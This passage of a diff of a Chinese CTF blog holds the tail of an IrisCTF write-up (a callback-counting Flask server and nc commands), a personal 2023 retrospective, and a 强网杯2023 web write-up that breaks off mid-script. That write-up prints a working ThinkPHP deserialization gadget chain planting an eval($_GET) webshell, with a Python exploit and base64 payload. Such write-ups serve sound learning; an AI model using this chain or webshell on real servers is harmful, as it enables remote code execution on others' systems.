callbacks[index][cb] += 1</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] = 1</span></span><br><span class="line"><span class="string">    print(callbacks)</span></span><br><span class="line"><span class="string">    return make_response(&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/result&#x27;)</span></span><br><span class="line"><span class="string">def result():</span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if index &gt;= len(callbacks):</span></span><br><span class="line"><span class="string">        return make_response(&#x27;Nope&#x27;)</span></span><br><span class="line"><span class="string">    return make_response(str(callbacks[index]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.run(debug=True, port=48080)</span></span><br></pre></td></tr></table></figure>
+
+<p>example:</p>
+<p>echo “<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pz">https://edu.ghost1032.top/leak/0/pz</a>“ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 would have 2 callback requests</p>
+<p>while</p>
+<p>echo “<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pl">https://edu.ghost1032.top/leak/0/pl</a>“ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 only has 1 callback request.</p>
+<p>You should try a couple of times for every char, since <code>Sorry if the timeout is a bit broken on this challenge</code></p>
+<p>And that’s why I don’t have a working full-automatic exp :(</p>
+<p>Maybe we can solve the issue by making multiple tries for every char.</p>
+<p>I made some exploit, trying now …</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;please_no_more_unintended_bugs&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/Insomni-hack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -192,7 +563,16 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-02-05 00:00:09 / 修改时间：00:11:11" itemprop="dateCreated datePublished" datetime="2024-02-05T00:00:09+08:00">2024-02-05</time>
+              <time title="创建时间：2024-02-05 00:00:09 / 修改时间：00:21:02" itemprop="dateCreated datePublished" datetime="2024-02-05T00:00:09+08:00">2024-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
             </span>
 
           
@@ -260,10 +640,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-01-29 13:38:57 / 修改时间：15:31:42" itemprop="dateCreated datePublished" datetime="2024-01-29T13:38:57+08:00">2024-01-29</time>
+              <time title="创建时间：2024-01-29 13:38:57" itemprop="dateCreated datePublished" datetime="2024-01-29T13:38:57+08:00">2024-01-29</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-05 00:19:33" itemprop="dateModified" datetime="2024-02-05T00:19:33+08:00">2024-02-05</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -286,27 +672,381 @@
 
       
           <h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>emmm，我也想总结一下下（QWQ）我的2023。</p>
-<p><img src="/images/wps1.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps1.png" alt="img"> </p>
 <h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>高考完之后，莫名的就像填计算机啦，也不知道为啥。进入学校发现并且接触到小红帽这个组织，其实我超级社恐，经过学长的帮助我成功进入了网络部，vocal，发现这里有超级🐂而且还喜欢帮助我们的学长学姐，也有志同道合的朋友，感觉真是幸福了。然后就开始正式开始前端啦，不知道是因为喜欢还是想努力一点，反正就是经常都学到深夜，然后在学长学姐的推荐↓参加了网页设计大赛，呃呃呃第二名，我有亿点社恐然后还没有准备，答辩的时候，我不知道我们在讲些啥，哈哈哈总归学了那么久还是有点收货啦</p>
-<p><img src="/images/wps2.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps2.png" alt="img"> </p>
 <h2 id="网安"><a href="#网安" class="headerlink" title="网安"></a>网安</h2><p>怎么说呢，也是在学长的帮助下，加上这个东西有点兴趣，就拉着一个挺上进的室友去参加了一个emmm算是小培训吧，vocal在这里又认识了另外一些学长学姐，恰逢网页设计大赛之前，我也恰好遇到一些问题，反正就没听这个培训的内容(后面被举报了d(ŐдŐ๑)，就全去问大佬网页的问题了。</p>
 <p>然后就是国赛的招新赛啦！我只能说是真的有点运气好，叫上我的室友，我们就开始第一次CTF了，怎么说呢，感觉有种有点上瘾的感觉，哈哈哈后来才知道，还是学长很用心的出了适合我们的题目(不然只能当场退役了)，恰好之前学了一点点前端，再加上室友当时听了一些培训的内容，总之我们俩还是成功选上了。到了国赛初赛我才知道，CTF的不同，校内选拔赛全靠学长努力���，我根本不会啊，我记得学长问我这个符号是啥  ^   其实我很懵，我根本不知道啊，我连别人做好的我连脚本都看不懂，但好在学长学姐努力���，我成功进线下赛啦。虽然我们队没有取得好成绩，属于是直接去旅游啦（真的是去旅游的！真的），但是现在才知道，才接触CTF就有这种机会，真的超级幸运了（说不完根本说不完，只能感谢学长们了@kdxcxs，@CH3NQU）…………真的一路全靠带</p>
-<p><img src="/images/wps3.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps3.png" alt="img"> </p>
 <h2 id="遗憾"><a href="#遗憾" class="headerlink" title="遗憾"></a>遗憾</h2><p>好像是暑假的时候，其实当时才国赛回来，emm感觉我啥也不会，很受伤狠狠的质疑了自己。然后有一填参加了一下nepnep的招新赛，其实当时我也不知道是招新赛，只是在nss看见这个比赛了，我就去打了一下下，有些题目感觉真的可能做出来，就去bilibili看了一下赛后讲解（绝对不是为了抽奖qwq），然后发现可以投简历NepNep啊，那么大的战队，感觉离我很远很远，但是感觉挺好奇的之前没有投过简历，我直接Google找到一个模板，浅填了一下基本信息，然后里面啥也没有了。vocal，hr加我了，我有面试的机会，很激动很激动，但是感觉自己真的学的很少很少，就属于是漫无目的的学，知道一些东西但是仅限于知道。然后就跟CH3NQU大哥说了，大哥是真的很好很好，经常帮助我。然后我们聊了很多，也鼓励我冲。反正我啥也没有这种机会也不要钱，那就冲吧，还帮我联系到了贝塔姐（NepNep战队的，vocal深藏不露，我这是又认识一个大佬，我跑去跟贝塔姐也聊了很多，哈哈哈哈谁不喜欢高质量人才呢，我只能再次说我好幸运，贝塔姐也帮我。</p>
 <p>开始面试，vocal我都不知道是几个大佬在轮番拷打我了，这时候我才发现，我是真不会啊，但这也是学习的机会，我知道了自己的很多不足啦，我心里很清楚，没抓住这次机会。还是怪自己之前努力并不够。然后vocal，kdxcxs哥直接一个电话打过来，说帮我复盘这个面试，然后还叫上了贝塔姐。vocal我何德何能啊。总之，真的是很幸运很幸运了，但是自己还是得加油，遗憾就遗憾吧，不能那么多好事都让我占了吧</p>
-<p><img src="/images/wps4.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps4.png" alt="img"> </p>
 <h2 id="幸运"><a href="#幸运" class="headerlink" title="幸运"></a>幸运</h2><p>emm前面都说了那么多幸运了，但是还是想继续说一些其它的，比如遇到超级超级温柔漂亮的女朋友（其他不告诉你）。比如小红帽，这里真是我大学以来开始努力的地方，恰好遇到了很多志同道合的朋友，很多学长学姐都在帮助我们，哈哈哈比如之前说了那么多的CH3NQU大哥，卫老师（怎么说就是🐂，就是好），贺最（怎么说，就是亲民）还有很多很多不是我们部门的人啦，比如秋秋姐，王最，蒋老师他们（说不完根本说不完）。当然，也少不了我们一级的干事了，磊子哥，娅姐，棋总，坤哥，小学同学等等等等等等等，还有其它部门的很多好朋友们。下半年也是继续留着小红帽了，我们又找到了新干事们了，属于都是很牛的，很卷的，总之就是各有所长了。再比如室友们，大家都超级和睦，相处起来非常融洽，属于是在高考完刷抖音刷到寝室问题的时候心里提起的大石头，算是落地了。</p>
 <p>然后就是C0ba1t了，队友们感觉不仅很强，而且都很努力，属于是找到另一个归属了</p>
 <p>然后就是CO啦，这里真的很多大佬了，有很负责的老师，还有很多很多大佬学长，有很多的资源，有非常好的学习氛围。真的非常荣幸能够进入co</p>
 <p>（不行太多了，说不完根本说不完）</p>
 <p>总之就是很幸运啦！</p>
-<p><img src="/images/wps5.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps5.png" alt="img"> </p>
 <h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><p>下半年我们自己打了很多CTF比赛，很多时候都是去坐牢了d(ŐдŐ๑)没办法我太菜了(;´༎ຶД༎ຶ&#96;) ，但是，还是很多很多收货都，比如线下见到暑假网友辉哥，还看见很多其它学校的大佬，最后获得了二等奖，属于是有点不甘心但是有一些意外，但是更多的还是我太菜了d(ŐдŐ๑)。然后然后vocal大佬直接带我们进r3kapig子战队，又属于是幸福了，然后那些比赛就是以另一种奇特的方式坐牢了d(ŐдŐ๑)，开始接触更多的国际赛，很少很少做出题。在notion里面看见大佬的解题思路，真的属于是走进新世界的大门，真的有很努力的复现了，但是有些真的看着思路给了exp我都打不出来，菜的想死，甚至还能把自己电脑文件搞掉，服务器直接被拿下。真服了。</p>
 <p>但是在这途中还是参加了一下其他的比赛，属于是混奖了，王最大哥直接带飞。还有其它的我就只写个网页，就其他的全靠别人的成果了。</p>
-<p><img src="/images/wps6.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps6.png" alt="img"> </p>
 <h2 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a>挖洞</h2><p>在年末那几天，CH3NQU哥拿下几个学校的漏洞，我之前也试过但是苦于根本找不到在哪，然后就在那几天突然发现一个洞，然后没过几天浅试一下就又找到了。感觉就是挖简单的洞只要有点经验，然后很容易找到的（我想要0day，我想CVE������）</p>
-<p><img src="/images/wps7.png" alt="img"> </p>
+<p><img src="/2024/01/29/my2023total/wps7.png" alt="img"> </p>
 <p>总之呢，2023有很多很多幸运都事情，也有很多很多烦恼，也不是一些文字螚描述清楚的，emmm，反正还是得继续继续努力，越想自己越菜，加油吧！！！！！冲冲冲！！</p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/27/qiangwangbei/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/27/qiangwangbei/" class="post-title-link" itemprop="url">强网杯2023</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-27 00:26:21" itemprop="dateCreated datePublished" datetime="2023-12-27T00:26:21+08:00">2023-12-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-05 00:31:20" itemprop="dateModified" datetime="2024-02-05T00:31:20+08:00">2024-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>给了docker，代码逻辑</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230623159-1707064057755-1.png" alt="image-20231218230623159"></p>
+<p>mad，开局这里不是admin</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231219003304097-1707064057755-2.png" alt="image-20231219003304097"></p>
+<p>这个函数有sql注入</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230743819-1707064057755-3.png" alt="image-20231218230743819"></p>
+<p>找到逻辑</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230846206-1707064057755-4.png" alt="image-20231218230846206"></p>
+<p>继续</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230905900-1707064057755-5.png" alt="image-20231218230905900"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&#x27;data&#x27;])))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/27/qiangwangbei/image-20231218231424714-1707064057755-6.png" alt="image-20231218231424714"></p>
+<p>抓包，获取请求数据</p>
+<p>从docker中可以看到，flag不在数据库里面，所以我们需要RCE，emm</p>
+<p>这里有个反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Pipes</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Relation</span><br><span class="line">&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line"></span><br><span class="line">abstract class OneToOne extends Relation</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasOne extends OneToOne</span><br><span class="line">&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;, &quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line"></span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//目的调用其write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#修改处</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Output对象,目的是调用__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line"></span><br><span class="line">class Query</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler = new File();//目的调用File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">#File</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27; =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27; =&gt; &#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize([new Windows()]));</span><br></pre></td></tr></table></figure>
+
+<p>直接网上找条链子就打通了</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218232718457-1707064057755-7.png" alt="image-20231218232718457"></p>
+<p>需要数组形式的</p>
+<p>然后构造一个sql语句</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218235801197-1707064057755-8.png" alt="image-20231218235801197"></p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://192.168.153.130:36000/public/index.php/index/admin/do_edit.html&#x27;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;: &#x27;l98e9omcje3gljtum9ith1ffn6&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exp = &quot;YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Njp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTE6IgAqAGJpbmRBdHRyIjthOjI6e2k6MDtzOjI6Im5vIjtpOjE7czozOiIxMjMiO31zOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czo3ODoicGhwOi8vZmlsdGVyL3dyaXRlPXN0cmluZy5yb3QxMy9yZXNvdXJjZT0uLzw/Y3VjIGN1Y3Zhc2IoKTtyaW55KCRfVFJHW3B6cV0pOz8+IjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtiOjE7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjE6e3M6MTA6IgAqAGhhbmRsZXIiO086MjM6InRoaW5rXGNhY2hlXGRyaXZlclxGaWxlIjoyOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6Nzg6InBocDovL2ZpbHRlci93cml0ZT1zdHJpbmcucm90MTMvcmVzb3VyY2U9Li88P2N1YyBjdWN2YXNiKCk7cmlueSgkX1RSR1twenFdKTs/PiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7YjoxO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX1zOjE1OiIAKgBzZWxmUmVsYXRpb24iO2I6MDtzOjg6IgAqAHF1ZXJ5IjtPOjE0OiJ0aGlua1xkYlxRdWVyeSI6MTp7czo4OiIAKgBtb2RlbCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czo3ODoicGhwOi8vZmlsdGVyL3dyaXRlPXN0cmluZy5yb3QxMy9yZXNvdXJjZT0uLzw/Y3VjIGN1Y3Zhc2IoKTtyaW55KCRfVFJHW3B6cV0pOz8+IjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6NjoiACoAdGFnIjtiOjE7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX1zOjg6IgAqAGFhYWFhIjtOO319fX0=&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;id&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;name&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;price&#x27;: &#x27;1.00&#x27;,</span><br><span class="line">    